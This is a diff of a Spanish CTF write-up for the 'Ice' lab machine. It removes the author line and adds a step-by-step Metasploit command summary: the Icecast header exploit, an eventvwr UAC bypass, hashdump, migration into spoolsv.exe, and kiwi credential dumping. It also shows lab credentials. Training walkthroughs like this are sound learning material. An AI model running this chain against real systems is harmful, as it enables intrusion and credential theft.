@@ -1,7 +1,5 @@
 # Write-up Ice
 
-**Autor**: Asier González
-
 ## Reconocimiento
 
 Empiezo con un reconocimiento de puertos usando `nmap`:
@@ -114,3 +112,20 @@ Las credenciales obtenidas son:
 - Username: `Dark`
 - Domain: `DARK-PC`
 - Password: `Password01!`
+
+
+## Resumen de comandos directo a escalada
+
+1. db_nmap -sS -sV -O -T4 10.128.146.75
+2. use exploit/windows/http/icecast_header
+3. SET RHOSTS IP - SET LHOST IP
+4. run
+5. background
+6. use exploit/windows/local/bypassuac_eventvwr
+7. SET SESSION <ID> - SET LHOST IP
+8. run
+9. hashdump
+10. ps
+11. migrate -P <PID> (buscar spoolsv.exe)
+12. load kiwi
+13. creds_all
